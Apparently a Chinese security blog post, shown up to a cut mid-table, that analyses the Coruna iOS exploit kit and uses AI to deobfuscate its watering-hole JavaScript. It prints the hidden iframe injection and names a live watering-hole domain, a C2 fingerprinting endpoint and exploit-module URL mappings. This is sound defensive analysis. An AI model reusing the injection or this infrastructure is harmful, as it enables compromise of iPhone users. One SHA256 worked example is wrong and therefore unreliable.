#  实战：我如何用AI分析Coruna iOS漏洞利用工具包？  
原创 T0daySeeker
                    T0daySeeker  T0daySeeker   2026-03-23 03:40  
  
```
文章首发地址：https://xz.aliyun.com/news/91790文章首发作者：T0daySeeker
```  
## 概述  
  
3月4日，谷歌威胁情报小组发布了一篇《Coruna: The Mysterious Journey of a Powerful iOS Exploit Kit》报告，报告披露了一种名为“Coruna”的iOS漏洞工具包，该工具包包含5条完整的iOS漏洞利用链和23个漏洞利用程序，可对运行iOS 13.0至iOS17.2.1的iPhone设备实施水坑攻击。  
  
报告发布后，国内外陆续有不少研究人员对其漏洞利用过程及代码逻辑进行了深入剖析。笔者也不例外，也对此事件进行了全方位的复盘。  
  
在研究过程中，结合笔者的实操分析及国内外研究人员的分析方法，笔者最大的感受就是：**「AI赋能样本分析，成效显著，事半功倍！！！」**  
  
具体如下：  
- 代码混淆复杂：Coruna利用链中的漏洞利用程序多为JavaScript脚本，其函数与变量均经过高强度混淆处理；  
  
- 静态分析受阻：在缺乏动态调试环境、仅能依赖静态分析的场景下，人工梳理海量混淆代码极具挑战性；  
  
- AI提效显著：引入AI辅助后，模型能有效还原混淆代码的可读性，将原本晦涩的逻辑清晰化，极大地提升了逆向分析的效率。  
  
## 水坑网站分析  
  
基于谷歌报告中提到的水坑网站列表，笔者对其进行了二次探测，发现目前部分站点还存活。  
  
结合水坑网站的利用场景，笔者从水坑网站列表中选择了iphonex.mjdqw.cn  
站点作为分析案例。  
  
谷歌报告截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GzZfia8ETvfaLiaMZYwaDM6njCYkpNGCjeoU4Wib1wUWXThrMNGXvbWsZsJPB16OqHgZHU25Ppe5QKCNFALPjT7wuZwN2Y2ykYb4E/640?wx_fmt=png&from=appmsg "")  
### 首页嵌入代码  
  
直接访问iphonex.mjdqw.cn网站，单从网页页面是无法发现任何异常的。  
  
若查看网站源代码，即会发现此网站源代码中嵌入了一段隐藏型iframe，代码如下：  
- <iframe src="tuiliu_group" style="position: fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>  
  
通过分析嵌入代码，可发现此代码将iframe的属性全部设置成了0，用以实现隐藏自身的效果。  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1GwR01xndBGss1VhuccicMaxSLE45DxJCSlfknUYF8eJiartA9loo5ZJH6LFIoicbke7WArS1PCV1MA56kMiaQ20dKOf97EKVHhyRgo/640?wx_fmt=png&from=appmsg "")  
### 恶意JavaScript框架  
  
尝试使用浏览器的F12开发者工具查看网站请求数据，可很明显的看到加载隐藏iframe的网络请求（https://iphonex.mjdqw.cn/tuiliu/group.html  
）。  
  
对网络请求响应代码进行分析，发现此代码内容即为谷歌报告中提到的恶意JavaScript框架。  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gysym4icHiaPibiaq2DatmRapJLDKpHrnf0uyZKwtQ90MOcpgoLcT4ibpoWbVE1Koe7sf8bwwTbyG8lnwU7aibBt58KjSqpyqHOj2TcI/640?wx_fmt=png&from=appmsg "")  
### 其他外联行为  
  
进一步分析，发现访问网站首页还可触发恶意JavaScript框架的指纹识别模块功能：  
- 外联https://ipv4.icanhazip.com/  
获取IP信息；  
  
- 外联https://8df9.cc/api/ip-sync/sync  
发送IP信息、设备系统版本；  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1Gz455MXnV3rRrIhCEIbDMpkXdEBA8Mc4nyDNHprhvhXso5sehgG410XibGKmojbvz25MA5yJATCQBTNMSlR9j8gXzSP4CibBkibkY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1GwyVlib8B0JODCfnAzvyIXuSwUctJRDPz6iaciaSWRibWaMnibT8Nd7CreGd5UrJqZttx2oFVzwibcGMGumkXoLCCN9FmPJ415rZAeicw/640?wx_fmt=png&from=appmsg "")  
### AI生成的网站前端？  
  
由于iphonex.mjdqw.cn网站是水坑网站，因此，笔者对其生成方式做了两种假设猜想：  
- 此网站是基于正常网站克隆生成的；  
  
- 此网站是基于AI工具辅助开发生成的；  
  
通过互联网搜索及AI代码分析，笔者得出如下结论：  
- 未发现任何与该网站内容高度相似的正常合法网站；  
  
- 存在内容完全相同的镜像站点，但目前已无法访问；  
  
- 将网站首页源代码提交AI进行分析后，AI明确判定：**「该网站由AI生成」**  
。  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GywAzA0twVYprlzCKrEAKG2sMOs0ZTH80XVsicqmPAHE9yn3XLL955SrUPBickk7dj3pZsvZ5SfrSn2WbBeXSOFwBpTXyLVDjeoY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GzoOXTXd0fqiaf1jdDHqCYgycj6xYe0ibUSRbQP7QumNibqA3wC5huKMWAYqWLu39uBmTkS3QAibSZHQxwILyYGvVGYPkX5Cbd5zcU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1Gwjymq8aPhkiaXRzfdV78ibx6RkHcgszfvFicgGfZGEtDtYwMSjf1zfvjy6jfjy5gAM40DDbWm3gL8d9hkYBJP7qykUWPGQbTeQno/640?wx_fmt=png&from=appmsg "")  
## 解码混淆数据  
  
由于js脚本中使用了代码混淆技术对大量的字符串和整数进行了混淆，而笔者又认为此类字符串和整数均比较重要，所以，针对此类数据的解码，笔者选择人工为主、AI为辅的方式进行分析处理。  
### 简单代码拆分  
  
为了能够更清晰的分析代码，我们可先将group.html中的Base64编码字符串进行逐层拆分，拆分后获得文件结构如下：  
- group.html  
  
- utils.js（57620206d62079baad0e57e6d9ec93120c0f5247）  
  
- config.js（14669ca3b1519ba2a8f40be287f646d4d7593eb0）  
  
- framework.js  
  
group.html代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GydWraosQvicTLatI4mcKBshelpwvHI8ztkvHrcoJDCGa6sHPfn4GWPPlzxFtRsNIfVBq1nAJfZ6f8IFVk1PqJOcEB78WlMtOxw/640?wx_fmt=png&from=appmsg "")  
  
framework.js代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gx1Ru0bP7p5CibKvkjK5mIwJcudk4BRcvfwIFBKvfDXkwNGMYCN0naHX5pKD84IbxSwQibuSNASLnlvtM5U7KJp15Cl0ia9YDPvSE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GwYZEAxcicJRAPwr0Y29lsnmzrs2aE8KCWqsG7xpudLShjlhE3bEkD5truCaiaMIicmPfI5C2CJfv4KTVdA7giaicqjzfggnJdANxJA/640?wx_fmt=png&from=appmsg "")  
  
utils.js（57620206d62079baad0e57e6d9ec93120c0f5247）代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GyrDUQwXFRHfcxIUYRyR9ibNYHvaWnE1ibZ2mVY8icLfpz9iayekzxLUtkZJxG9m0jhpQMDktYSLu7GLCVXRjNKSb7HJTKsOt08xjg/640?wx_fmt=png&from=appmsg "")  
  
config.js（14669ca3b1519ba2a8f40be287f646d4d7593eb0）代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GzKO53ia8T9JhbU1wyiaVAMGEMI53Apu6hSufQ8xtMDERQl8JY8dBkc7GArtcd71x7rBULBkVsvh3wp3omvmTicpbUP0f49qD7IUM/640?wx_fmt=png&from=appmsg "")  
### 混淆字符串/整数  
  
通过对上述拆分后的文件代码进行分析，发现上述代码存在以下格式的混淆字符串和整数：  
- 混淆字符串：[69, 31, 71].map(p => String.fromCharCode(p ^ 122)).join("")  
  
- group.html文件中存在；  
  
- 混淆字符串：[126, 124, 109].map(x => {return String.fromCharCode(x ^ 57);}).join("")  
  
- framework.js、utils.js、config.js文件中存在；  
  
- 谷歌报告中提到过此格式的代码混淆技术；  
  
- 混淆整数：(1232621146 ^ -1232617894)  
  
- framework.js、utils.js、config.js文件中存在；  
  
- 谷歌报告中提到过此格式的代码混淆技术；  
  
在浏览器F12开发者工具中，运行上述混淆字符串/整数即可得到真实字符串及整数内容。  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gw4O76iczoOR6F9S9AwbYJia0dAcuwxibUmRj0eInKvVz8Ir0CuibGqdAZb95Giaq65w0ZjsKO8NIHso69SARVYTjzb0uDRZl3xFbAM/640?wx_fmt=png&from=appmsg "")  
### 代码去混淆  
  
通过分析，由于上述拆分后的文件代码中存在大量上述格式的混淆字符串和整数，因此，笔者琢磨按照如下思路对其去混淆处理：  
- 使用正则匹配混淆字符串和整数内容；  
  
- 提取混淆字符串和整数的运算值；  
  
- 使用运算值进行运算，得到运算结果；  
  
- 在源代码中，使用运算结果替换混淆字符串和整数；  
  
由于上述处理逻辑比较简单，因此，我们可直接使用AI辅助我们编写去混淆程序。  
  
笔者构建的去混淆程序运行输出如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1GxmtAjY3gO9zoqNh1icOIHxjrbWkzLJ1eZt2MOdXVygZKXBiaXD5rAk9n3fBbwtYWCuSlCLXwicFRLqwK7dk4UmA4rWu3n8zy8Z1A/640?wx_fmt=png&from=appmsg "")  
  
由于是AI编写的代码，也没啥特别的难度，所以，笔者在这里仅简单同步一下使用的正则代码片段，就不同步完整的程序代码了。  
  
笔者使用的编程语言是Go语言，代码中使用的正则表达式如下：  
- 正则1：  
  
```
re := regexp.MustCompile(`(\[\s*([\d\s,-]+)\]\s*\.\s*map\s*\(\s*([a-zA-Z_$][\w$]*)\s*=>\s*String\.fromCharCode\s*\(\s*([a-zA-Z_$][\w$]*)\s*\^\s*(-?\d+)\s*\)\s*\)\s*\.\s*join\s*\(\s*(?:""|\s*|'')\s*\))`)
```  
- 正则2：  
  
```
re := regexp.MustCompile(`(?s)(?P<full>\[\s*(?P<array>[\d\s,-]+)\]\s*\.\s*map\s*\(\s*[a-zA-Z_$][\w$]*\s*=>\s*\{?\s*return\s*String\.fromCharCode\s*\(\s*[a-zA-Z_$][\w$]*\s*\^\s*(?P<xor_key>[+-]?\d+)\s*\)\s*;?\s*\}?\s*\)\s*\.\s*join\s*\(\s*(?:""|''|)\s*\))`)
```  
- 正则3：  
  
```
re := regexp.MustCompile(`\(\s*-?\d+\s*\^\s*-?\d+\s*\)`)
```  
  
去混淆前代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gy1Qice78MR0R8aQXWH2cictHrMc4p3OU275yiaibBhNwBMhu1X38nB6Vf0bBialorMpH4TpagbR2axKE46YVN6LyQnF3Ch4uIYXtgw/640?wx_fmt=png&from=appmsg "")  
  
去混淆后代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1Gxn7ic9xksptbrltpFWEx0yPlxTqLCRMphS7l3oW1l8AeEnWelwmDFDenl65vEyibjG10afTSpnDqUClCLq5Xbib6iaAl2fudL5ySI/640?wx_fmt=png&from=appmsg "")  
  
使用VS Code格式化代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1Gwfr0SkQAkXO54ibrckjq9cMDKcFiajkddbicKmKun4p2uVzwFr2ickNHR3OH2VTuZEf0g2Kb1O1KNSf9goBa1AKp0B5ak0YtlDbPg/640?wx_fmt=png&from=appmsg "")  
## AI还原混淆代码  
  
对混淆字符串/整数进行解码后，混淆代码中的混淆数据就只有混淆函数名、混淆变量名了。所以，这里笔者选择AI为主、人工为辅的方式进行分析处理。  
### AI提问  
  
由于此前未积累符合此分析场景的提示词，所以笔者就直接将自己的想法提供给AI，让AI帮忙整理了一套可用于还原混淆代码的提示词。  
  
AI反馈的提示词内容如下：  
```
我有4个相互调用的 JS 脚本（group_dec.html、framework_dec.js、utils_dec.js、config_dec.js），代码如下：=== 文件1: group_dec.html ====== 文件2: framework_dec.js ====== 文件3: utils_dec.js ====== 文件4: config_dec.js ===请严格按照以下步骤逐步分析，不要跳步，每步输出后等待我确认再继续下一大步：第 1 步：整体去混淆 & 重命名- 对 4 个文件进行统一 deobfuscation：  - 恢复可读语法（简化控制流、展开 IIFE、去除死代码等）  - 把所有变量名、函数名重命名为有意义的名字（基于实际功能推断，例如：downloadPayload、checkC2、executeStealer、obfuscatedMain 等）  - 保持 4 个文件之间的 import/调用关系不变，并在代码中用注释标注“来自 scriptX.js 的调用”- 输出 4 个**干净、可直接阅读**的新版本代码块（每个文件单独一个代码块），并说明你做了哪些重命名逻辑。第 2 步：完整运行流程分析- 梳理整个系统的执行顺序（从哪个脚本入口开始 → 如何相互调用 → 条件分支 → 最终行为）- 用清晰的文本流程图（Markdown）展示：  入口 → 步骤1 → 步骤2 → … → 结束- 标注每个关键步骤的恶意意图（例如：环境检测、下载 payload、解密执行、C2 通信等）第 3 步：外联地址提取与风险评估- 提取所有硬编码/动态生成的外部地址（URL、域名、IP、WebSocket、API 端点等）- 分类整理成表格：类型（C2、payload 下载、第三方服务等）、出现位置、是否加密传输、风险等级（高/中/低）- 如果有动态拼接的地址，也请还原完整 URL
```  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GxubCoK1t681KgI0MQLfNvsQxON49lngjqF5MP70PSH5jq20eZoUfNZgPvYo0nk8kjm2dbD7FdibOjXwe7g4t5bma7Dfd5YMnRA/640?wx_fmt=png&from=appmsg "")  
### AI结果-提取完整运行流程  
  
根据提示词要求的分析步骤，AI帮我提取了完整运行流程，我们可从中提取关键功能如下：  
- 建立动态模块加载器：BaseURL + SHA256哈希  
  
- 根据17个版本flag选择不同hash下载执行器  
  
- 判断特定Safari版本  
  
- GET发送状态码到C2  
  
- 获取真实公网IP + OS版本，上报到固定API  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GzBzSiaCT8hMm3rrHpc3AnEXA2D2UVSTc7DV2c04LvicEw18EW9mYjlsU9wicicC5feBWg0sHXBW0ftETmLkhTgBg4c9S1B1RSkdMk/640?wx_fmt=png&from=appmsg "")  
### AI结果-提取外联地址  
  
根据提示词要求的分析步骤，AI帮我提取了外联地址信息，我们可从中提取关键功能如下：  
- 当前域名Payload下发  
  
- 同步设备指纹至C2  
  
- 查询公网IP  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gw3okuX3QTpk2NJ7e464tlLGRthQ2SoTLzQGiacPE9T5fN43Ydf7hPzeb0lsuC3zoDsNDVDBSCPLCiaFmakomYqialUAzkO1EHicbA/640?wx_fmt=png&from=appmsg "")  
### AI结果-提取去混淆代码  
  
根据提示词要求的分析步骤，AI帮我将关键函数名、变量进行了重命名，增强了代码可读性，我们可直接下载保存。  
  
相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1GwSShibjKbjQ0qdTcvRQtdibQbLCEoXyAIVYCsyEBlRYA1ziapVBwCynLrBwSSpiaeROWveVO1nwtMT4rE8561CbODoKkbMdpL9ocI/640?wx_fmt=png&from=appmsg "")  
## 代码分析  
  
现在，我们虽然有了AI处理过后的可读性代码，逻辑上来说，可直接基于AI分析结果进一步分析代码执行流程。  
  
但经过笔者实践，建议还是结合原始代码配合分析比较好。  
  
因为笔者发现：**「AI在优化过程中可能会重构甚至删减部分代码结构；若关键逻辑片段被遗漏，将直接影响分析结果的准确性。」**  
### 设备指纹识别  
  
通过分析，恶意JavaScript框架加载后，将识别设备指纹，并将设备指纹信息外联发送：  
- 外联https://ipv4.icanhazip.com  
获取IP地址；  
  
- 基于User Agent提取设备版本信息；  
  
- 发送IP地址、设备系统版本、CHANNEL_CODE至https://8df9.cc/api/ip-sync/sync  
地址；  
  
- 与【水坑网站分析】->【其他外联行为】章节中的内容相同；  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GyA8mO0dITOq0dVibV9wffJ0vKblED1aSOGiclcMGWPdL41O37DCvLA75Y09NfZpXcGmFB7icRudoia8hribeAmNrHywtHIyEeB4jPg/640?wx_fmt=png&from=appmsg "")  
### 外联加载模块  
  
通过分析，恶意JavaScript框架加载后，将通过外联加载模块的方式运行漏洞利用模块，外联模块URL由模块ID转换生成，转换方式如下：  
- 拼接字符串：内置key + 模块ID  
  
- 例如：cecd08aa6ff548c2 + e3b6ba10484875fabaed84076774a54b87752b8a  
  
- SHA256运算：sha256(内置key + 模块ID)  
  
- 例如：sha256(“cecd08aa6ff548c2" + "e3b6ba10484875fabaed84076774a54b87752b8a”) = “cecd08aa6ff548c2e3b6ba10484875fabaed84076774a54b87752b8a”  
  
- hash字符串截断前40字节：sha256(内置key + 模块ID)[0:40]  
  
- “6beef463953ff422511395b79735ec990bed65f4487bc18f6bfdf5ad77553089”[0:40] = “6beef463953ff422511395b79735ec990bed65f4”  
  
sha256运算截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GwvZBKRz6hcclZx0OaxBQAvpn1WiaHulYdwHW5fhC6gsxPKTQbYSkRzoKDDC13dC67QaXZSxVUbv8kQTW7ddfSAt3roiaeTwKw28/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GwibvueTWME8jvDMPySHzE4qRnGZcAriafRxia7uS3JiaXyJwDJMdug0pI274QQAc6UAhsCv9oRXZyLYksliatXDZaRnvCjhvic0UYicI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GwOPTz4vxvcaaAVnJl3ddPZVPWyRNcB1FqujgGyLcp0v7hGHDVxUQ8jCQINdD9ibRnt5OicVFVCrIMQxyK7EHFrFibz5hOv71R0L8/640?wx_fmt=png&from=appmsg "")  
### WebKit漏洞利用  
  
通过分析，恶意JavaScript框架加载后，将根据iOS版本外联对应的WebKit漏洞利用模块。  
  
iOS版本与模块ID的对应关系如下：  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块ID</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">漏洞适用范围</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">e3b6ba10484875fabaed84076774a54b87752b8a</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">16.6-17.2.1</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">57cb8c6431c5efe203f5bfa5a1a83f705cb350b8</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">16.2-16.5</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">d11d34e4d96a4c0539e441d861c5783db8a1c6e9</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">15.6-16.1</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">ea3da0cfb0a5bdb8c440dd4a963f94cbd39d9e44</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">15.2-15.5</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">7d8f5bae97f37aa318bccd652bf0c1dc38fd8396</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">11.0-15.1</span></section></td></tr></tbody></table>  
进一步分析，基于模块外联URL的转换方式，将模块ID转换为模块URL，梳理模块ID与模块URL的对应关系如下：  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块ID</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块URL</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">e3b6ba10484875fabaed84076774a54b87752b8a</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">6beef463953ff422511395b79735ec990bed65f4.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">57cb8c6431c5efe203f5bfa5a1a83f705cb350b8</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">8c4451cf1258f9a8d6a8af27864f111fd69a0e99.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">d11d34e4d96a4c0539e441d861c5783db8a1c6e9</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">ff4f3cb4711fb364b52de5ab04a8f83140466f89.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">ea3da0cfb0a5bdb8c440dd4a963f94cbd39d9e44</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">46ecd515ac9e99ef0603063db39303a0fd849632.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">7d8f5bae97f37aa318bccd652bf0c1dc38fd8396</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">5ff38f5342bb3c931bc504d6fa3523d0c8865b93.js</span></section></td></tr></tbody></table>  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GzC6n4VpkibHSP70Y3do1QUvM7FYqodYt7DtSKiceKHicKiaPOJqn1gfNKCJMmia5iaOKTz4da1IbWrOy9tMd3WKd0Ymzr50ZibyW4ZMc/640?wx_fmt=png&from=appmsg "")  
  
外联模块URL截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gw0oOy9ZFT62B4CMWicAlQ5SzKaHYsYkvYbdx7tXkeIJIkCCsT1EXhcOic5mJykbjYaiaMTdxchJyKxsbr7GSgiaj24T2tFpibq2060/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1Gxvtpea5pgLJibYfqvKUu1Uy1tibOFiajygTVLwJ43EkaiczyGUqlODRc6ddhPYnV7tLvxicNFVgFlHAn6Axn2SEHaRhOtKY9uibCk8w/640?wx_fmt=png&from=appmsg "")  
### PAC指针认证绕过  
  
通过分析，成功利用WebKit漏洞利用模块后，恶意JavaScript框架又将根据iOS版本外联对应的WebKit漏洞利用模块。  
  
iOS版本与模块ID的对应关系如下：  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块ID</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">漏洞适用范围</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">16.6-17.2.1</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">29b874a9a6cc9fa9d487b31144e130827bf941bb</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">17.0-17.2.1</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">9db8a84aa7caa5665f522873f49293e8eebccd5c</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">16.6-16.7.12</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">171a7da1934de9e0efb9c1645f4575f88e482873</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">16.3-16.5.1</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">91b278ddb2aec817b10c1535e0963da74f9b8eeb</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">15.0-16.2</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td data-colwidth="435" style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">b586c88246144bc7975ad4e27ec6d62716bf34ea</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">13.0-14.x</span></section></td></tr></tbody></table>  
进一步分析，基于模块外联URL的转换方式，将模块ID转换为模块URL，梳理模块ID与模块URL的对应关系如下：  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块ID</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块URL</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">bef10a7c014b826e9dd645984e80baf313c1635f.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">29b874a9a6cc9fa9d487b31144e130827bf941bb</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">4a75f0551eba446b4fa35127024a84b71d9688d6.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">9db8a84aa7caa5665f522873f49293e8eebccd5c</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">3fd66b32c44150acff3dcb80f86c759574148ed5.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">171a7da1934de9e0efb9c1645f4575f88e482873</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span 